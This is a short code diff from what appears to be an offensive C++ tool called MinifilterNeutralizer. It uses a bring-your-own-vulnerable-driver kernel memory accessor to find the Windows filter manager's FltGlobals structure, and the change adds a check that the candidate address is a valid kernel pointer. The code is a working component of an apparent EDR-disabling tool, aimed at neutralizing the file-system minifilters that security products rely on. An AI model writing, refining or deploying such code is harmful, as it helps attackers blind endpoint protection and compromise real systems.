@@ -3080,11 +3080,22 @@ uint64_t MinifilterNeutralizer::FindFltGlobals(uint64_t fltmgrBase) {
         }
         uint64_t candidate = ScanFuncForFltGlobals(fltmgrBase, targetFunc);
         if (candidate) {
-            ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s)\n",
-                (unsigned long long)candidate, exportName);
-            return candidate;
+            // ★ BUILD 461: 验证候选地址 — 读取前 8 字节, 必须是有效内核地址
+            uint64_t firstQword = 0;
+            if (KernelMemoryAccessor::Instance().ReadKernelVA(candidate, &firstQword, 8)) {
+                // 内核地址范围: 0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF
+                // 排除 ASCII 垃圾/段内偏移 (如 0x656E72656B6E696D)
+                if (firstQword >= 0xFFFF800000000000ULL && firstQword < 0xFFFFFFFFFFFFFFFFULL) {
+                    ByovdDiag("FLT:NTRL: FltGlobals at 0x%llX (via %s) verified\n",
+                        (unsigned long long)candidate, exportName);
+                    return candidate;
+                }
+                ByovdDiag("FLT:NTRL: %s candidate 0x%llX rejected (qword=0x%016llX not kernel ptr)\n",
+                    exportName, (unsigned long long)candidate, (unsigned long long)firstQword);
+            }
+        } else {
+            ByovdDiag("FLT:NTRL: %s found but no .data LEA/MOV ref\n", exportName);
         }
-        ByovdDiag("FLT:NTRL: %s found but no .data LEA/MOV ref\n", exportName);
     }
     ByovdDiag("FLT:NTRL: FltGlobals not found via any export\n");
     return 0;
